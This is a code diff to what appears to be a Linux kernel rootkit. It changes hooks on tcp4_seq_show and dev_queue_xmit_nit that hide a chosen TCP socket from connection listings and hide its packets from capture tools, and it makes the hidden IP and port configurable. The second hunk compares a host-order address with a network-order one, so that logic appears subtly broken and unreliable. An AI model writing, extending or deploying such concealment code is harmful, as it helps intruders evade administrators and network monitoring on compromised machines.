@@ -41,9 +41,13 @@ static asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *v) {
   if (v && v != SEQ_START_TOKEN) {
     struct inet_sock *inet = (struct inet_sock *)v;
 
-    if (inet && inet->inet_dport == htons(DEST_PORT) &&
-        inet->inet_daddr == htonl(DEST_IP_NUM)) {
-      return 0; // Hide the socket
+    if (inet) {
+      u32 target_ip = in_aton(dAddress);
+
+      // Compare the destination port and IP address
+      if (inet->inet_dport == htons(dPort) && inet->inet_daddr == target_ip) {
+        return 0; // Hide the socket
+      }
     }
   }
 
@@ -56,11 +60,13 @@ static asmlinkage void dev_queue_xmit_nit_hook(struct sk_buff *skb,
     struct iphdr *iph = ip_hdr(skb);
     u32 daddr = ntohl(iph->daddr);
 
+    u32 target_ip = in_aton(dAddress);
     if (iph->protocol == IPPROTO_TCP) {
       struct tcphdr *tcph = tcp_hdr(skb);
       u16 dest_port = ntohs(tcph->dest);
 
-      if (dest_port == DEST_PORT && daddr == DEST_IP_NUM) {
+      // Compare the destination port and IP address directly
+      if (dest_port == dPort && daddr == target_ip) {
         return; // Hide the packet
       }
     }
